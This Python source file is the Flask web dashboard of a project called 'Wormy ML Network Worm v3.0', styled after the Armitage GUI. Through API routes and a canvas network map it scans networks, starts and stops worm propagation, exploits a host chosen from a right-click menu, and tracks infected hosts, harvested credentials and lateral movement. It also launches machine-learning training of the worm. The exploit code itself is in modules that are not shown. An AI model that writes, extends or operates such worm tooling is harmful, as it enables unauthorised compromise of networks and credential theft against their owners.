"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Armitage-Style Dashboard
Visual network map with host icons, training panel, and real-time control
Inspired by Armitage's Metasploit GUI
"""

import json
import logging
import os
import sys
import threading
import time
from datetime import datetime
from typing import Dict, List, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger

# ── Silence Flask/Werkzeug access logs (they pollute Rich Live TUI) ───────────
logging.getLogger("werkzeug").setLevel(logging.ERROR)
logging.getLogger("flask.app").setLevel(logging.ERROR)

try:
    from flask import Flask, jsonify, render_template_string, request

    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False


class ArmitageDashboard:
    """
    Armitage-style Dashboard

    Features:
    - Visual network map with host icons (like Armitage)
    - Color-coded hosts (green=infected, red=failed, blue=discovered)
    - Training panel with progress bars
    - Real-time propagation control
    - Host right-click context menu
    - Activity feed
    - Simple, clean interface
    """

    def __init__(self, worm_core=None, trainer=None, host: str = "0.0.0.0", port: int = 5001):
        self.worm = worm_core
        self.trainer = trainer
        self.host = host
        self.port = port
        self._thread = None

        if not FLASK_AVAILABLE:
            logger.error("Flask not available")
            return

        self.app = Flask(__name__)
        self._setup_routes()
        logger.info(f"Armitage Dashboard initialized on {host}:{port}")

    def _setup_routes(self):
        @self.app.route("/")
        def index():
            return render_template_string(self._get_html())

        @self.app.route("/api/map")
        def api_map():
            return jsonify(self._get_map_data())

        @self.app.route("/api/training")
        def api_training():
            return jsonify(self._get_training_data())

        @self.app.route("/api/start_training", methods=["POST"])
        def api_start_training():
            data = request.json or {}
            scenarios = data.get("scenarios", ["small_office", "enterprise"])
            if self.trainer:
                threading.Thread(
                    target=self.trainer.train,
                    kwargs={"scenarios": scenarios, "total_episodes": 100},
                    daemon=True,
                ).start()
            return jsonify({"status": "started", "scenarios": scenarios})

        @self.app.route("/api/start_propagation", methods=["POST"])
        def api_start_propagation():
            if self.worm and not getattr(self.worm, "running", False):
                threading.Thread(target=self.worm.propagate, daemon=True).start()
            return jsonify({"status": "propagation_started"})

        @self.app.route("/api/stop_propagation", methods=["POST"])
        def api_stop_propagation():
            if self.worm:
                self.worm.stop()
            return jsonify({"status": "stopped"})

        @self.app.route("/api/exploit_host", methods=["POST"])
        def api_exploit_host():
            data = request.json or {}
            ip = data.get("ip", "")
            if self.worm and ip:
                target = next((t for t in self.worm.scan_results if t["ip"] == ip), None)
                if target:
                    threading.Thread(
                        target=self.worm.exploit_target, args=(target,), daemon=True
                    ).start()
            return jsonify({"status": "exploiting", "target": ip})

        @self.app.route("/api/scan", methods=["POST"])
        def api_scan():
            if self.worm:
                threading.Thread(target=self.worm.scan_network, daemon=True).start()
            return jsonify({"status": "scanning"})

    def _get_map_data(self) -> Dict:
        hosts = []
        if self.worm:
            for host in self.worm.scan_results:
                ip = host["ip"]
                is_infected = ip in self.worm.infected_hosts
                is_failed = ip in self.worm.failed_targets
                status = "infected" if is_infected else ("failed" if is_failed else "discovered")

                hosts.append(
                    {
                        "id": ip,
                        "ip": ip,
                        "os": host.get("os_guess", "Unknown"),
                        "status": status,
                        "ports": host.get("open_ports", []),
                        "vuln_score": host.get("vulnerability_score", 0),
                        "services": host.get("services", {}),
                        "vulnerabilities": len(host.get("vulnerabilities", [])),
                        "exploit_chain": len(host.get("exploit_chain", [])),
                    }
                )

        if self.worm and self.worm.host_monitor:
            mapped_ips = {h["ip"] for h in hosts}
            for ip, host_state in self.worm.host_monitor.hosts.items():
                if ip not in mapped_ips:
                    hosts.append(
                        {
                            "id": ip,
                            "ip": ip,
                            "os": host_state.os_guess,
                            "status": host_state.status,
                            "ports": host_state.open_ports,
                            "vuln_score": 0,
                            "services": {},
                            "vulnerabilities": 0,
                            "exploit_chain": 0,
                        }
                    )

        edges = []
        if self.worm and self.worm.host_monitor:
            for ip, hs in self.worm.host_monitor.hosts.items():
                for lm in hs.lateral_movement_history:
                    edges.append(
                        {
                            "from": ip,
                            "to": lm.get("target", ""),
                            "technique": lm.get("technique", ""),
                            "success": lm.get("success", False),
                        }
                    )

        stats = {}
        if self.worm:
            stats = {
                "infected": len(self.worm.infected_hosts),
                "failed": len(self.worm.failed_targets),
                "discovered": len(self.worm.scan_results),
                "vulnerabilities": self.worm.stats.get("vulnerabilities_found", 0),
                "credentials": self.worm.stats.get("credentials_discovered", 0),
                "lateral": self.worm.stats.get("lateral_success", 0),
                "running": self.worm.running,
                "start_time": self.worm.start_time.isoformat() if self.worm.start_time else None,
            }

        return {"hosts": hosts, "edges": edges, "stats": stats}

    def _get_training_data(self) -> Dict:
        if not self.trainer:
            return {"available": False}

        status = self.trainer.get_training_status()
        return {
            "available": True,
            "trained": status["trained"],
            "best_reward": status.get("best_reward", 0),
            "total_episodes": status.get("total_episodes", 0),
            "scenarios": status.get("scenarios", []),
            "timestamp": status.get("timestamp", ""),
            "available_scenarios": ["small_office", "enterprise", "datacenter", "cloud", "iot"],
        }

    def _get_html(self) -> str:
        return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wormy - Network Map</title>
    <style>
        :root {
            --bg-primary: #0a0a0a;
            --bg-secondary: #111111;
            --bg-tertiary: #1a1a1a;
            --border: #222222;
            --text-primary: #e5e5e5;
            --text-secondary: #888888;
            --text-muted: #555555;
            --accent: #3b82f6;
            --accent-hover: #2563eb;
            --success: #22c55e;
            --success-bg: rgba(34, 197, 94, 0.1);
            --danger: #ef4444;
            --danger-bg: rgba(239, 68, 68, 0.1);
            --warning: #f59e0b;
            --warning-bg: rgba(245, 158, 11, 0.1);
            --purple: #a855f7;
            --purple-bg: rgba(168, 85, 247, 0.1);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            font-size: 13px;
        }

        /* Top Bar */
        .topbar {
            background: var(--bg-secondary);
            border-bottom: 1px solid var(--border);
            padding: 0 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            height: 48px;
        }
        .topbar h1 {
            font-size: 14px;
            font-weight: 500;
            color: var(--text-primary);
            letter-spacing: -0.01em;
        }
        .topbar .controls {
            display: flex;
            gap: 6px;
        }
        .btn {
            padding: 6px 12px;
            border: 1px solid var(--border);
            background: var(--bg-tertiary);
            color: var(--text-primary);
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            font-family: inherit;
            font-weight: 500;
            transition: all 0.15s;
        }
        .btn:hover { background: var(--border); }
        .btn-success { background: var(--success); border-color: var(--success); color: #fff; }
        .btn-success:hover { background: #16a34a; }
        .btn-danger { background: var(--danger); border-color: var(--danger); color: #fff; }
        .btn-danger:hover { background: #dc2626; }
        .btn-primary { background: var(--accent); border-color: var(--accent); color: #fff; }
        .btn-primary:hover { background: var(--accent-hover); }

        /* Main Layout */
        .main {
            display: flex;
            flex: 1;
            overflow: hidden;
        }

        /* Left Panel */
        .left-panel {
            width: 260px;
            background: var(--bg-secondary);
            border-right: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            overflow-y: auto;
        }
        .panel-section {
            padding: 12px;
            border-bottom: 1px solid var(--border);
        }
        .panel-section h3 {
            font-size: 11px;
            font-weight: 600;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin-bottom: 10px;
        }
        .stat-row {
            display: flex;
            justify-content: space-between;
            padding: 4px 0;
            font-size: 12px;
        }
        .stat-row .label { color: var(--text-secondary); }
        .stat-row .value { color: var(--text-primary); font-weight: 500; }
        .stat-row .value.success { color: var(--success); }
        .stat-row .value.danger { color: var(--danger); }
        .stat-row .value.warning { color: var(--warning); }

        .progress-bar {
            width: 100%;
            height: 4px;
            background: var(--bg-tertiary);
            border-radius: 2px;
            overflow: hidden;
            margin-top: 8px;
        }
        .progress-fill {
            height: 100%;
            background: var(--success);
            transition: width 0.5s;
        }

        /* Center - Network Map */
        .center-panel {
            flex: 1;
            position: relative;
            background: var(--bg-primary);
            overflow: hidden;
        }
        #network-map {
            width: 100%;
            height: 100%;
        }

        /* Right Panel - Activity */
        .right-panel {
            width: 280px;
            background: var(--bg-secondary);
            border-left: 1px solid var(--border);
            display: flex;
            flex-direction: column;
        }
        .activity-feed {
            flex: 1;
            overflow-y: auto;
            padding: 8px;
        }
        .activity-item {
            padding: 8px;
            border-bottom: 1px solid var(--border);
            font-size: 11px;
        }
        .activity-item .time { color: var(--text-muted); font-size: 10px; }
        .activity-item .type {
            display: inline-block;
            padding: 2px 6px;
            border-radius: 4px;
            font-size: 10px;
            font-weight: 500;
            margin: 0 4px 0 0;
        }
        .type-infected { background: var(--success-bg); color: var(--success); }
        .type-failed { background: var(--danger-bg); color: var(--danger); }
        .type-scan { background: rgba(59, 130, 246, 0.1); color: var(--accent); }
        .type-lateral { background: var(--warning-bg); color: var(--warning); }
        .type-credential { background: var(--purple-bg); color: var(--purple); }
        .activity-item .details { color: var(--text-secondary); margin-top: 2px; }

        /* Legend */
        .legend {
            position: absolute;
            bottom: 12px;
            left: 12px;
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 10px;
            font-size: 11px;
        }
        .legend-item {
            display: flex;
            align-items: center;
            gap: 6px;
            margin: 4px 0;
        }
        .legend-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
        }
        .dot-infected { background: var(--success); }
        .dot-failed { background: var(--danger); }
        .dot-discovered { background: var(--accent); }

        /* Context Menu */
        .context-menu {
            position: absolute;
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 4px 0;
            min-width: 160px;
            z-index: 1000;
            display: none;
            box-shadow: 0 4px 12px rgba(0,0,0,0.4);
        }
        .context-menu.show { display: block; }
        .context-menu-item {
            padding: 8px 12px;
            cursor: pointer;
            font-size: 12px;
            transition: background 0.1s;
        }
        .context-menu-item:hover { background: var(--bg-tertiary); }
        .context-menu-item.danger { color: var(--danger); }
    </style>
</head>
<body>
    <div class="topbar">
        <h1>Wormy Network Map</h1>
        <div class="controls">
            <button class="btn btn-primary" onclick="scanNetwork()">Scan</button>
            <button class="btn btn-success" onclick="startPropagation()">Propagate</button>
            <button class="btn btn-danger" onclick="stopPropagation()">Stop</button>
            <button class="btn" onclick="refreshMap()">Refresh</button>
        </div>
    </div>

    <div class="main">
        <div class="left-panel">
            <div class="panel-section">
                <h3>Statistics</h3>
                <div class="stat-row"><span class="label">Infected</span><span class="value success" id="stat-infected">0</span></div>
                <div class="stat-row"><span class="label">Discovered</span><span class="value" id="stat-discovered">0</span></div>
                <div class="stat-row"><span class="label">Failed</span><span class="value danger" id="stat-failed">0</span></div>
                <div class="stat-row"><span class="label">Vulnerabilities</span><span class="value warning" id="stat-vulns">0</span></div>
                <div class="stat-row"><span class="label">Credentials</span><span class="value" id="stat-creds">0</span></div>
                <div class="stat-row"><span class="label">Lateral Movement</span><span class="value success" id="stat-lateral">0</span></div>
                <div class="stat-row"><span class="label">Status</span><span class="value" id="stat-status">Stopped</span></div>
            </div>

            <div class="panel-section">
                <h3>Training</h3>
                <div class="stat-row"><span class="label">Status</span><span class="value" id="training-status">Not Trained</span></div>
                <div class="stat-row"><span class="label">Episodes</span><span class="value" id="training-episodes">0</span></div>
                <div class="stat-row"><span class="label">Best Reward</span><span class="value" id="training-reward">0</span></div>
                <div class="progress-bar">
                    <div class="progress-fill" id="training-progress" style="width:0%"></div>
                </div>
            </div>
        </div>

        <div class="center-panel" id="map-container">
            <canvas id="network-map"></canvas>
            <div class="legend">
                <div class="legend-item"><div class="legend-dot dot-infected"></div> Infected</div>
                <div class="legend-item"><div class="legend-dot dot-discovered"></div> Discovered</div>
                <div class="legend-item"><div class="legend-dot dot-failed"></div> Failed</div>
            </div>
        </div>

        <div class="right-panel">
            <div class="panel-section" style="border-bottom:none;">
                <h3>Activity Feed</h3>
            </div>
            <div class="activity-feed" id="activity-feed">
                <div style="color:var(--text-muted);padding:20px;text-align:center;">Waiting for activity...</div>
            </div>
        </div>
    </div>

    <div class="context-menu" id="context-menu">
        <div class="context-menu-item" onclick="exploitHost()">Exploit</div>
        <div class="context-menu-item" onclick="scanHost()">Scan</div>
        <div class="context-menu-item" onclick="viewVulns()">Vulnerabilities</div>
        <div class="context-menu-item" onclick="viewCreds()">Credentials</div>
        <div class="context-menu-item danger" onclick="removeHost()">Remove</div>
    </div>

    <script>
        let hosts = [];
        let edges = [];
        let contextMenuHost = null;

        const canvas = document.getElementById('network-map');
        const ctx = canvas.getContext('2d');

        function resizeCanvas() {
            const container = document.getElementById('map-container');
            canvas.width = container.clientWidth;
            canvas.height = container.clientHeight;
            drawMap();
        }
        window.addEventListener('resize', resizeCanvas);

        function refreshMap() {
            fetch('/api/map')
                .then(r => r.json())
                .then(data => {
                    hosts = data.hosts || [];
                    edges = data.edges || [];
                    updateStats(data.stats || {});
                    drawMap();
                });
            fetch('/api/training')
                .then(r => r.json())
                .then(data => {
                    updateTraining(data);
                });
        }

        function updateTraining(data) {
            if (!data.available) return;
            const statusEl = document.getElementById('training-status');
            statusEl.textContent = data.trained ? 'Trained' : 'Training...';
            statusEl.style.color = data.trained ? 'var(--success)' : 'var(--warning)';
            
            document.getElementById('training-episodes').textContent = data.total_episodes || 0;
            document.getElementById('training-reward').textContent = (data.best_reward || 0).toFixed(2);
            
            const progressEl = document.getElementById('training-progress');
            if (data.trained) {
                progressEl.style.width = '100%';
            } else if (statusEl.textContent === 'Training...') {
                const current = parseFloat(progressEl.style.width) || 0;
                progressEl.style.width = Math.min(95, current + 5) + '%';
            }
        }

        function updateStats(stats) {
            document.getElementById('stat-infected').textContent = stats.infected || 0;
            document.getElementById('stat-discovered').textContent = stats.discovered || 0;
            document.getElementById('stat-failed').textContent = stats.failed || 0;
            document.getElementById('stat-vulns').textContent = stats.vulnerabilities || 0;
            document.getElementById('stat-creds').textContent = stats.credentials || 0;
            document.getElementById('stat-lateral').textContent = stats.lateral || 0;
            document.getElementById('stat-status').textContent = stats.running ? 'Running' : 'Stopped';
            document.getElementById('stat-status').style.color = stats.running ? 'var(--success)' : 'var(--danger)';
        }

        function drawMap() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);

            // Draw grid
            ctx.strokeStyle = '#1a1a1a';
            ctx.lineWidth = 0.5;
            for (let x = 0; x < canvas.width; x += 40) {
                ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, canvas.height); ctx.stroke();
            }
            for (let y = 0; y < canvas.height; y += 40) {
                ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(canvas.width, y); ctx.stroke();
            }

            // Force-directed layout simulation
            const nodeRadius = 24;
            const padding = 60;
            
            // Initialize positions if not set
            if (!hosts[0] || !hosts[0].x) {
                const cols = Math.ceil(Math.sqrt(hosts.length));
                const spacingX = Math.min(100, (canvas.width - padding * 2) / cols);
                const spacingY = Math.min(80, (canvas.height - padding * 2) / Math.ceil(hosts.length / cols));
                const startX = (canvas.width - (cols - 1) * spacingX) / 2;
                const startY = padding;

                hosts.forEach((host, i) => {
                    const col = i % cols;
                    const row = Math.floor(i / cols);
                    host.x = startX + col * spacingX;
                    host.y = startY + row * spacingY;
                    host.vx = 0;
                    host.vy = 0;
                });
            }

            // Simple force simulation
            for (let iter = 0; iter < 50; iter++) {
                // Repulsion between nodes
                for (let i = 0; i < hosts.length; i++) {
                    for (let j = i + 1; j < hosts.length; j++) {
                        const dx = hosts[j].x - hosts[i].x;
                        const dy = hosts[j].y - hosts[i].y;
                        const dist = Math.sqrt(dx * dx + dy * dy) || 1;
                        const force = 500 / (dist * dist);
                        hosts[i].vx -= force * dx / dist;
                        hosts[i].vy -= force * dy / dist;
                        hosts[j].vx += force * dx / dist;
                        hosts[j].vy += force * dy / dist;
                    }
                }

                // Attraction along edges
                edges.forEach(edge => {
                    const from = hosts.find(h => h.id === edge.from);
                    const to = hosts.find(h => h.id === edge.to);
                    if (from && to) {
                        const dx = to.x - from.x;
                        const dy = to.y - from.y;
                        const dist = Math.sqrt(dx * dx + dy * dy) || 1;
                        const force = (dist - 100) * 0.01;
                        from.vx += force * dx / dist;
                        from.vy += force * dy / dist;
                        to.vx -= force * dx / dist;
                        to.vy -= force * dy / dist;
                    }
                });

                // Center gravity
                const centerX = canvas.width / 2;
                const centerY = canvas.height / 2;
                hosts.forEach(h => {
                    h.vx += (centerX - h.x) * 0.001;
                    h.vy += (centerY - h.y) * 0.001;
                });

                // Apply forces
                hosts.forEach(h => {
                    h.vx *= 0.8;
                    h.vy *= 0.8;
                    h.x += h.vx;
                    h.y += h.vy;
                    // Keep in bounds
                    h.x = Math.max(padding, Math.min(canvas.width - padding, h.x));
                    h.y = Math.max(padding, Math.min(canvas.height - padding, h.y));
                });
            }

            // Draw edges
            edges.forEach(edge => {
                const from = hosts.find(h => h.id === edge.from);
                const to = hosts.find(h => h.id === edge.to);
                if (from && to) {
                    ctx.beginPath();
                    ctx.moveTo(from.x, from.y);
                    ctx.lineTo(to.x, to.y);
                    ctx.strokeStyle = edge.success ? 'rgba(34, 197, 94, 0.3)' : 'rgba(239, 68, 68, 0.2)';
                    ctx.lineWidth = 2;
                    ctx.stroke();

                    // Arrow
                    const angle = Math.atan2(to.y - from.y, to.x - from.x);
                    const arrowDist = nodeRadius + 4;
                    const arrowX = to.x - arrowDist * Math.cos(angle);
                    const arrowY = to.y - arrowDist * Math.sin(angle);
                    ctx.beginPath();
                    ctx.moveTo(arrowX, arrowY);
                    ctx.lineTo(arrowX - 8 * Math.cos(angle - 0.4), arrowY - 8 * Math.sin(angle - 0.4));
                    ctx.moveTo(arrowX, arrowY);
                    ctx.lineTo(arrowX - 8 * Math.cos(angle + 0.4), arrowY - 8 * Math.sin(angle + 0.4));
                    ctx.stroke();
                }
            });

            // Draw hosts
            hosts.forEach(host => {
                const color = host.status === 'infected' ? 'var(--success)' :
                              host.status === 'failed' ? 'var(--danger)' : 'var(--accent)';
                const colors = { success: '#22c55e', danger: '#ef4444', accent: '#3b82f6' };
                const nodeColor = colors[host.status === 'infected' ? 'success' : host.status === 'failed' ? 'danger' : 'accent'];
                const bgColor = host.status === 'infected' ? 'rgba(34, 197, 94, 0.1)' :
                               host.status === 'failed' ? 'rgba(239, 68, 68, 0.1)' : 'rgba(59, 130, 246, 0.1)';

                // Node circle
                ctx.fillStyle = bgColor;
                ctx.strokeStyle = nodeColor;
                ctx.lineWidth = 2;
                ctx.beginPath();
                ctx.arc(host.x, host.y, nodeRadius, 0, Math.PI * 2);
                ctx.fill();
                ctx.stroke();

                // Icon
                ctx.fillStyle = nodeColor;
                ctx.font = 'bold 14px -apple-system, BlinkMacSystemFont, sans-serif';
                ctx.textAlign = 'center';
                ctx.textBaseline = 'middle';
                const icon = host.status === 'infected' ? '✓' : host.status === 'failed' ? '✗' : '?';
                ctx.fillText(icon, host.x, host.y);

                // IP label
                ctx.fillStyle = '#888888';
                ctx.font = '10px -apple-system, BlinkMacSystemFont, sans-serif';
                ctx.textBaseline = 'top';
                ctx.fillText(host.ip, host.x, host.y + nodeRadius + 6);

                // OS label
                ctx.fillStyle = '#555555';
                ctx.font = '9px -apple-system, BlinkMacSystemFont, sans-serif';
                ctx.fillText(host.os.substring(0, 15), host.x, host.y + nodeRadius + 20);
            });
        }

        // Context menu
        canvas.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            const rect = canvas.getBoundingClientRect();
            const mx = e.clientX - rect.left;
            const my = e.clientY - rect.top;

            contextMenuHost = hosts.find(h => {
                const dx = mx - h.x;
                const dy = my - h.y;
                return Math.sqrt(dx * dx + dy * dy) < 24;
            });
            const menu = document.getElementById('context-menu');
            if (contextMenuHost) {
                menu.style.left = e.clientX + 'px';
                menu.style.top = e.clientY + 'px';
                menu.classList.add('show');
            } else {
                menu.classList.remove('show');
            }
        });

        canvas.addEventListener('click', () => {
            document.getElementById('context-menu').classList.remove('show');
        });

        function exploitHost() {
            if (!contextMenuHost) return;
            fetch('/api/exploit_host', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ip: contextMenuHost.ip})
            });
            addActivity('exploit', contextMenuHost.ip, 'Exploiting ' + contextMenuHost.ip);
            document.getElementById('context-menu').classList.remove('show');
        }

        function scanHost() {
            if (!contextMenuHost) return;
            addActivity('scan', contextMenuHost.ip, 'Scanning ' + contextMenuHost.ip);
            document.getElementById('context-menu').classList.remove('show');
        }

        function viewVulns() {
            if (!contextMenuHost) return;
            alert('Vulnerabilities for ' + contextMenuHost.ip + ':\\nScore: ' + contextMenuHost.vuln_score + '/100\\nCount: ' + contextMenuHost.vulnerabilities);
            document.getElementById('context-menu').classList.remove('show');
        }

        function viewCreds() {
            alert('Credentials panel coming soon');
            document.getElementById('context-menu').classList.remove('show');
        }

        function removeHost() {
            document.getElementById('context-menu').classList.remove('show');
        }

        function addActivity(type, host, details) {
            const feed = document.getElementById('activity-feed');
            const time = new Date().toLocaleTimeString();
            const typeClass = 'type-' + type;
            const item = document.createElement('div');
            item.className = 'activity-item';
            item.innerHTML = '<span class="time">' + time + '</span><span class="type ' + typeClass + '">' + type.toUpperCase() + '</span><div class="details">' + details + '</div>';
            feed.insertBefore(item, feed.firstChild);
            if (feed.children.length > 50) feed.removeChild(feed.lastChild);
        }

        function startTraining() {
            fetch('/api/start_training', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({scenarios: ['small_office', 'enterprise']})
            });
            addActivity('training', 'system', 'Starting training');
        }

        function startPropagation() {
            fetch('/api/start_propagation', {method: 'POST'});
            addActivity('scan', 'system', 'Starting propagation');
        }

        function stopPropagation() {
            fetch('/api/stop_propagation', {method: 'POST'});
            addActivity('scan', 'system', 'Stopping propagation');
        }

        function scanNetwork() {
            fetch('/api/scan', {method: 'POST'});
            addActivity('scan', 'system', 'Network scan started');
        }

        // Auto-refresh
        setInterval(refreshMap, 3000);
        window.onload = () => {
            resizeCanvas();
            refreshMap();
        };
    </script>
</body>
</html>
"""

    def run(self, debug: bool = False):
        if not FLASK_AVAILABLE:
            return
        import logging as _log

        _log.getLogger("werkzeug").setLevel(_log.ERROR)
        logger.info(f"Starting Armitage Dashboard on {self.host}:{self.port}")
        self.app.run(
            host=self.host,
            port=self.port,
            debug=False,  # never debug — it spawns a second process
            threaded=True,
            use_reloader=False,  # prevents double-start on Windows
        )

    def run_background(self):
        if not FLASK_AVAILABLE:
            return None
        self._thread = threading.Thread(target=self.run, daemon=True)
        self._thread.start()
        logger.info(f"Armitage Dashboard running at http://{self.host}:{self.port}")
        return self._thread
